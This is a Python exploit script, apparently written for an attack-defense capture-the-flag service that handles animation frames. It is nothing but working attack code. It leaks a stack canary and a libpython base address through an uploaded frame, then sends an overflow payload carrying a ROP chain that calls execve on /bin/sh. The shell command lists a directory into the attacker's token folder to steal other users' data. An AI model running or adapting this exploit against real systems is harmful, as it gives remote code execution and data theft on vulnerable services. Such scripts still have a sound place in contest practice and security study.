#!/usr/bin/env python3

from pwn import *

from player_lib import *

host = sys.argv[1]

mch = CheckMachine(host)
u, p = mch.register_user()
sess = mch.login_user(u, p)


def decode(s):
    result = b''
    for i in range(0, len(s), 2):
        result += bytes([s[i + 1]]) * s[i]
    return result


payload_leak = p64(64) + b"A" * 8 + b"\x00"

token = mch.upload_frames(sess, 'kek', [payload_leak])

resp = mch.get_frames(sess, token, 0, 0)[0]
resp = decode(resp[8:])
canary = resp[24:32]

leak = u64(resp[-8:])

libpython_base = leak - 0x7f6f73143490 + 0x7f6f72e3c000

# 0x0000000000064117: syscall;
# 0x000000000005f00b: pop rax; ret;
# 0x0000000000065562: pop rdi; ret;
# 0x000000000006b111: pop rsi; ret;
# 0x000000000006536d: pop rdx; ret;
# 0x00000000000a7969: mov qword ptr [rdx], rdi; ret;

pop_rax = p64(libpython_base + 0x000000000005f00b)
pop_rdi = p64(libpython_base + 0x0000000000065562)
pop_rsi = p64(libpython_base + 0x000000000006b111)
pop_rdx = p64(libpython_base + 0x000000000006536d)
mov_rdx_rdi = p64(libpython_base + 0x00000000000a7969)
syscall = p64(libpython_base + 0x0000000000064117)
data_section = libpython_base + 0x002dd000

argv_addr = data_section + 0x100

argv_strings = data_section + 0x200


def pad(s):
    return s + b"\x00" * ((8 - len(s) % 8) % 8)


cmd = pad(b'/bin/sh\x00')

argv = [
    pad(b'/bin/sh\x00'),
    pad(b'-c\x00'),
    pad(f'ls /anime > /anime/{token}/0.frame\x00'.encode()),
]

rop = b""

for i in range(len(cmd) // 8):
    rop += pop_rdx + p64(data_section + i * 8)
    rop += pop_rdi + cmd[i * 8:(i + 1) * 8]
    rop += mov_rdx_rdi

for i in range(len(argv)):
    for j in range(len(argv[i]) // 8):
        rop += pop_rdx + p64(argv_strings + i * 0x20 + j * 8)
        rop += pop_rdi + argv[i][j * 8:(j + 1) * 8]
        rop += mov_rdx_rdi

for i in range(len(argv)):
    rop += pop_rdx + p64(argv_addr + i * 8)
    rop += pop_rdi + p64(argv_strings + i * 0x20)
    rop += mov_rdx_rdi

rop += pop_rdx + p64(argv_addr + len(argv) * 8)
rop += pop_rdi + p64(0)
rop += mov_rdx_rdi

rop += pop_rax + p64(0x3b)
rop += pop_rdi + p64(data_section)
rop += pop_rsi + p64(argv_addr)
rop += pop_rdx + p64(0)
rop += syscall

payload_rce = p64(72 + len(rop)) + b"A" * 8 + b"\x00" + b"B" * 15 + canary + b"C" * 40 + rop

mch.parse_frames(sess, [payload_rce])

print('All uploaded tokens:')
print(mch.get_frames(sess, token, 0, 0)[0].decode())
